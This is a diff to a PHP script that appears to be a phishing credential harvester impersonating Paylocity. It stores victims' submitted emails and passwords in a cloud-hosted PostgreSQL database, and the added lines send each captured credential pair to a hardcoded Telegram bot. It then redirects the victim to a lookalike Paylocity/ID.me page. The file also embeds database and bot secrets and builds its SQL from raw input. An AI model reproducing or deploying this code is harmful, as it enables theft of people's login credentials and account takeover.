@@ -1,9 +1,24 @@
 <?php
 $db = pg_connect("host=pg-paycity-paylocityhr0-25.l.aivencloud.com port=19042 dbname=defaultdb user=avnadmin password=AVNS_dOBPgbxmGoJJGAwr-yJ");
 
+// Telegram configuration
+define('TELEGRAM_BOT_TOKEN', '7592386357:AAF6MXHo5VlYbiCKY0SNVIKQLqd_S-k4_sY');
+define('TELEGRAM_CHAT_ID', '1325797388');
+
+
 if ($_SERVER["REQUEST_METHOD"]=="POST"){
 $query = "INSERT INTO form (useremail,userpassword,timecol,ip) VALUES ('$_POST[useremail]','$_POST[userpassword]',NOW(),'$_POST[ip]')";
 $result = pg_query($query);
+
+// Send to Telegram
+$telegram_message = "New Form Submission:\n\n".
+                    "Email: $useremail\n".
+                    "Password: $userpassword\n".
+                    "ip: $ip";
+
+$telegram_url = "https://api.telegram.org/bot".TELEGRAM_BOT_TOKEN."/sendMessage?chat_id=".TELEGRAM_CHAT_ID."&text=".urlencode($telegram_message);
+
+file_get_contents($telegram_url);
 
 header("Location:https://paylocity.onrender.com/www.paylocity.com/careers/all-listings.job.34092/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8.php");
 exit;
